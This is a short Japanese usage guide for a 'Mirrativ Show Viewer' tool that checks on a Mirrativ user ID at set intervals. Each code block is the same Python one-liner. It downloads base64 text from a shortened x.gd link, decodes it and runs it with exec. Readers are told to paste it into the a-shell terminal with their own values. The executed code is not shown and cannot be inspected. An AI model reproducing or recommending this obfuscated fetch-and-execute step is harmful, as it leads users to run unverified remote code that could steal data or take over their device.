# Mirrativ Show Viewer 使い方


```python
import requests as r, base64; exec(base64.b64decode(r.get('https://x.gd/638RgP').text).decode() + "\nmain(a,b,c)")
```

### 各説明

・a
`繰り返し回数`.(おすすめは100<回>)

・b
`1回辺りの待機時間`.(おすすめは60<1分>)
1回チェックしてからb秒待機して出力
2とかにするとほぼ毎秒チェックしてくれます

・c
`ユーザーID`.(ミラティブのユーザーID)
ここにチェックしたいユーザーIDを打ちます

### 使用例

まずコードの`a,b,c`の箇所を書き換えます
コード最後の方の\nmain〜〜の所
```python
import requests as r, base64; exec(base64.b64decode(r.get('https://x.gd/638RgP').text).decode() + "\nmain(a,b,c)")
```

①書き換えたプログラム全文を`コピー`。
```python
import requests as r, base64; exec(base64.b64decode(r.get('https://x.gd/638RgP').text).decode() + "\nmain(100,2,12345678)")
```

②次に、a-shellのターミナルに
`python`
と打ちます。

③pythonが起動するのでそこにコピーしたのを`貼り付け`。


プログラムを中止したい時はタスクを切ればOK
再開したい時は①からすれば出来ます。



